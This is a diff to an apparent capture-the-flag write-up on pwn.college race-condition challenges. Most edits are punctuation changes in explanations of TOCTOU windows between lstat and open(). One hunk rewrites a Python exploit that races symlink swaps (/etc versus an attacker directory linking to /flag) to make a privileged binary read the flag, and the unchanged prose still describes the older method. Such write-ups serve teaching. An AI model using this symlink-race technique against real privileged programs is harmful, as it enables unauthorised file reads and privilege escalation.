@@ -34,7 +34,7 @@ The key insight is that these checks and the subsequent `open()` call are **not 
 
 ```
 Timeline:
-  Program:   [lstat check — NOT symlink ✓] ----gap---- [open() → reads file]
+  Program:   [lstat check - NOT symlink ✓] ----gap---- [open() → reads file]
   Attacker:       ^real file here^          ^swap!^      ^symlink to /flag^
 ```
 
@@ -240,7 +240,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 ### TOCTOU
 
-Same TOCTOU vulnerability as level2.0 — `lstat` and `open()` are not atomic. Without the pauses however, the race window is only microseconds wide.
+Same TOCTOU vulnerability as level2.0 - `lstat` and `open()` are not atomic. Without the pauses however, the race window is only microseconds wide.
 
 ### Directory Maze
 
@@ -444,7 +444,7 @@ The checks and the subsequent `open()` call are **not atomic**. There is a windo
 
 ```
 Timeline:
-  Program:  [lstat check — small file ✓] --- gap --- [open() → reads file]
+  Program:  [lstat check - small file ✓] --- gap --- [open() → reads file]
   Attacker:      ^small "hi" file^          ^swap!^   ^big overflow file^
 ```
 
@@ -646,11 +646,11 @@ This is identical to [level3.0](#level30) with one critical difference: **the `g
 
 ### TOCTOU
 
-The checks and the subsequent `open()` call are still **not atomic**. The window between `lstat` and `open()` is now just natural CPU time — microseconds — but it still exists:
+The checks and the subsequent `open()` call are still **not atomic**. The window between `lstat` and `open()` is now just natural CPU time - microseconds - but it still exists:
 
 ```text
 Timeline:
-  Program:  [lstat check — small file ✓] -tiny gap- [open() → reads file]
+  Program:  [lstat check - small file ✓] -tiny gap- [open() → reads file]
   Attacker:      ^small "hi" file^          ^swap!^   ^big overflow file^
 ```
 
@@ -819,10 +819,10 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-At first glance this looks similar to level3.0 — three checks, two pauses, and a `read()` into `buf`. However there are two key differences:
+At first glance this looks similar to level3.0 - three checks, two pauses, and a `read()` into `buf`. However there are two key differences:
 
-1. **No `win` variable** — there is no `v7` on the stack to overflow into.
-2. **`buf` is never printed** — unlike level2.0, there is no `write(1, buf, v4)`. The file contents are read and silently discarded.
+1. **No `win` variable** - there is no `v7` on the stack to overflow into.
+2. **`buf` is never printed** - unlike level2.0, there is no `write(1, buf, v4)`. The file contents are read and silently discarded.
 
 Checking the binary's defined functions reveals a `win()` function that is never called from `main`:
 
@@ -903,11 +903,11 @@ End of assembler dump.
 
 ### TOCTOU
 
-Same wide race window as level3.0 — two `getchar()` pauses sit between the `lstat` check and `open()`:
+Same wide race window as level3.0 - two `getchar()` pauses sit between the `lstat` check and `open()`:
 
 ```text
 Timeline:
-  Program:  [lstat check — small file ✓] --- gap --- [open() → reads file]
+  Program:  [lstat check - small file ✓] --- gap --- [open() → reads file]
   Attacker:      ^small "hi" file^          ^swap!^   ^ROP payload file^
 ```
 
@@ -1139,7 +1139,7 @@ __uid_t win()
 
 This is identical to level4.0 with one key difference: the `getchar()` pauses are gone, making the race window microseconds wide instead of seconds.
 
-`win()` is never called from `main` — it opens `/flag` directly (hardcoded) and writes the contents to stdout. The goal is to redirect execution there via a stack buffer overflow + return address overwrite.
+`win()` is never called from `main` - it opens `/flag` directly (hardcoded) and writes the contents to stdout. The goal is to redirect execution there via a stack buffer overflow + return address overwrite.
 
 Checking the address of `win()` in pwndbg:
 
@@ -1466,7 +1466,7 @@ Pause 2 → stat(directory)    → checks dir is root-owned, no world-write
 Pause 3 → open(file)         → reads and outputs the file
 ```
 
-The directory check uses `stat()` which **follows symlinks** — so we can pass a symlink to a root-owned directory and it will follow it and check the target. This is the key: we don't need to own a root-owned directory, we just need to **point at one** when the check runs.
+The directory check uses `stat()` which **follows symlinks** - so we can pass a symlink to a root-owned directory and it will follow it and check the target. This is the key: we don't need to own a root-owned directory, we just need to **point at one** when the check runs.
 
 We pass the path `d/x` where `d` is a symlink we control, and swap it between three states across the three pauses:
 
@@ -1482,7 +1482,7 @@ Pause 3: d -> /home/hacker, x = symlink to /flag
          open("d/x") = open("/home/hacker/x") = open(/flag) -> reads flag ✓
 ```
 
-Note that `lstat` only checks the **final component** of the path for being a symlink — intermediate directory symlinks like `d` are followed freely. This is why swapping `d` does not trigger the symlink check.
+Note that `lstat` only checks the **final component** of the path for being a symlink - intermediate directory symlinks like `d` are followed freely. This is why swapping `d` does not trigger the symlink check.
 
 ### Exploit
 
@@ -1490,8 +1490,24 @@ Note that `lstat` only checks the **final component** of the path for being a sy
 import subprocess, time, os, warnings
 warnings.filterwarnings("ignore")
 
-# Setup
-os.system("rm -f /home/hacker/x && echo hi > /home/hacker/x")
+# Cleanup
+for x in ["pivot", "evil"]:
+    try:
+        if os.path.islink(x):
+            os.unlink(x)
+        elif os.path.isdir(x):
+            os.rmdir(x)
+        else:
+            os.remove(x)
+    except:
+        pass
+
+# attacker-controlled dir with symlink to /flag
+os.mkdir("evil")
+os.symlink("/flag", "evil/passwd")
+
+# initial pivot -> /etc
+os.symlink("/etc", "pivot")
 
 print("[*] Starting exploit loop...")
 attempt = 0
@@ -1500,44 +1516,33 @@ proc = None
 while True:
     attempt += 1
 
-    # Explicitly clean up previous process
     if proc is not None:
-        try:
-            proc.stdin.close()
-        except Exception:
-            pass
-        try:
-            proc.stdout.close()
-        except Exception:
-            pass
-        try:
-            proc.kill()
-        except Exception:
-            pass
-        try:
-            proc.wait()
-        except Exception:
-            pass
+        try: proc.stdin.close()
+        except: pass
+        try: proc.stdout.close()
+        except: pass
+        try: proc.kill()
+        except: pass
+        try: proc.wait()
+        except: pass
         proc = None
 
-    # Reset x to real file each attempt
-    os.system("rm -f /home/hacker/x && echo hi > /home/hacker/x")
-
+    # Reset pivot -> /etc for lstat and dir stat checks
     try:
-        os.remove("d")
+        os.unlink("pivot")
     except FileNotFoundError:
         pass
-    os.symlink("/home/hacker", "d")
+    os.symlink("/etc", "pivot")
 
     proc = subprocess.Popen(
-        ["/challenge/babyrace_level5.0", "d/x"],
+        ["/challenge/babyrace_level5.0", "pivot/passwd"],
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
         close_fds=True
     )
 
-    # Pause 1: lstat sees d/x = real file -> passes symlink check
+    # Pause 1: lstat sees /etc/passwd = real file -> passes symlink check
     time.sleep(0.1)
     try:
         proc.stdin.write(b"\n")
@@ -1545,14 +1550,7 @@ while True:
     except Exception:
         continue
 
-    # Swap d -> /etc so stat(dirname("d/x")) = stat(/etc) = root-owned, no world-write
-    try:
-        os.remove("d")
-    except FileNotFoundError:
-        pass
-    os.symlink("/etc", "d")
-
-    # Pause 2: stat sees /etc -> passes directory ownership check
+    # Pause 2: stat(dirname) sees /etc -> root-owned, no world-write
     time.sleep(0.05)
     try:
         proc.stdin.write(b"\n")
@@ -1560,15 +1558,14 @@ while True:
     except Exception:
         continue
 
-    # Swap d back to home, swap x to symlink -> open() reads /flag
+    # Swap pivot -> evil before open()
     try:
-        os.remove("d")
+        os.unlink("pivot")
     except FileNotFoundError:
         pass
-    os.symlink("/home/hacker", "d")
-    os.system("rm -f /home/hacker/x && ln -s /flag /home/hacker/x")
+    os.symlink("./evil", "pivot")
 
-    # Pause 3: open(d/x) = open(/home/hacker/x) = open(/flag)
+    # Pause 3: open("pivot/passwd") = evil/passwd -> /flag
     time.sleep(0.05)
     try:
         proc.stdin.write(b"\n")
@@ -1584,9 +1581,6 @@ while True:
     if attempt % 10 == 0:
         print(f"[*] Attempt {attempt}...")
 
-    if attempt <= 3:
-        print(f"[DBG] {out.decode(errors='replace')[-300:]}")
-
     if b"pwn.college" in out:
         print("[+] Got the flag!")
         print(out.decode(errors='replace'))
@@ -1596,6 +1590,7 @@ while True:
 ```text
 hacker@race-conditions~level5-0:~$ python ~/script.py
 [*] Starting exploit loop...
+[*] Attempt 90...
 [+] Got the flag!
 ###
 ### Welcome to /challenge/babyrace_level5.0!
@@ -1727,7 +1722,7 @@ Pause 2 → stat(directory)    → checks dir is root-owned, no world-write
 Pause 3 → open(file)         → reads and outputs the file
 ```
 
-The directory check uses `stat()` which **follows symlinks** — so we can pass a symlink to a root-owned directory and it will follow it and check the target. This is the key: we don't need to own a root-owned directory, we just need to **point at one** when the check runs.
+The directory check uses `stat()` which **follows symlinks** - so we can pass a symlink to a root-owned directory and it will follow it and check the target. This is the key: we don't need to own a root-owned directory, we just need to **point at one** when the check runs.
 
 We pass the path `d/x` where `d` is a symlink we control, and swap it between three states across the three pauses:
 
@@ -1743,7 +1738,7 @@ Pause 3: d -> /home/hacker, x = symlink to /flag
          open("d/x") = open("/home/hacker/x") = open(/flag) -> reads flag ✓
 ```
 
-Note that `lstat` only checks the **final component** of the path for being a symlink — intermediate directory symlinks like `d` are followed freely. This is why swapping `d` does not trigger the symlink check.
+Note that `lstat` only checks the **final component** of the path for being a symlink - intermediate directory symlinks like `d` are followed freely. This is why swapping `d` does not trigger the symlink check.
 
 ### Exploit
 
